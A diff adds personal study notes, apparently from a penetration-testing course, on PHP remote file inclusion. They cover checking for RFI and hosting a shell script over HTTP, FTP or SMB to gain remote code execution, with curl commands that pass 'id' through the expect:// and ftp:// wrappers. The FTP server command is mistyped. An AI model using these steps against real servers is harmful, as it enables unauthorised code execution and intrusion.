@@ -407,3 +407,78 @@ all we need to do with this is pass the `expect://` wrapper and pass the command
 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 ```
 
+## Remote File Inclusion (RFI)
+
+sometimes the vulnerable function will allow the inclusion of remote urls, which we can exploit for two main benefits: 
+- enumerate local-only ports and web apps for SSRF 
+- gain RCE by including malicious script that we host 
+
+### Local vs. remote file inclusion 
+
+these functions would allow RFI: 
+
+![](Images/Pasted%20image%2020240229095511.png)
+
+almost any RFI vulnerability is also an LFI vulnerability but an LFI might not always be RFI because: 
+- it might not allow remote URLs 
+- may only control a portion of the filename and not the entire protocol wrapper like `http://`, `ftp://`, and `https://` 
+- config may prevent RFI altogether as most modern servers disable remote files by default
+
+it is also worth noting that some function still will not allow code execution but we still would be able to enumerate local ports and web apps through SSRF 
+
+### Verify RFI 
+
+including remote URLs also requires `allow_url_include` to be enabled, but this isn't always reliable because even if it is set it still might not allow remote URLs   
+
+first we should always try a local url: 
+
+![](Images/Pasted%20image%2020240229100234.png)
+
+### Remote code execution with RFI 
+
+first we need to create a shell script in the required language and host it on our server, most likely on a common HTTP port like 80 or 443 because these might be whitelisted by the server  
+we may also host the script through an FTP service or an SMB service 
+
+we start our server with `sudo python3 -m http.server 443` and use our shell in the parameter: 
+
+![](Images/Pasted%20image%2020240229101156.png)
+
+![](Images/Pasted%20image%2020240229101217.png)
+
+make sure to always examine the request we send to look for things like appended file extensions 
+
+### FTP 
+
+we can also host our script through the FTP protocol   
+we can start a basic FTP server with python's pyftpdlib: 
+
+`sudo -m pyftpdlib -p 21`
+
+
+![](Images/Pasted%20image%2020240229101541.png)
+
+this may be useful in case that http ports are blocked by a firewall or `http://` in the url gets blocked by the WAF 
+
+PHP by default will try to authenticate as an anonymous user but if the server requires valid authentication then the credentials can be specified in the URL: 
+
+```shell
+curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+```
+
+### SMB 
+
+if the server is hosted on a windows server which we can tell from the server version in the HTTP response headers, then we don't need the `allow_url_include` setting to be enabled   
+we can instead use the SMB protocol for the RFI because windows treats files on remote SMB servers as normal files and can be referenced with a UNC path 
+
+we can create an SMB server with Impacket's smbserver.py which allows anonymous authentication by default: 
+
+```shell
+impacket-smbserver -smb2support share $(pwd)
+```
+
+then we include our script in the UNC path like `\\<our IP>\share\shell.php` and specify the command: 
+
+![](Images/Pasted%20image%2020240229102017.png)
+
+this attack is more likely to work if we are on the same network since accessing remote SMB servers over the internet might be disabled by default depending on the windows server config 
+
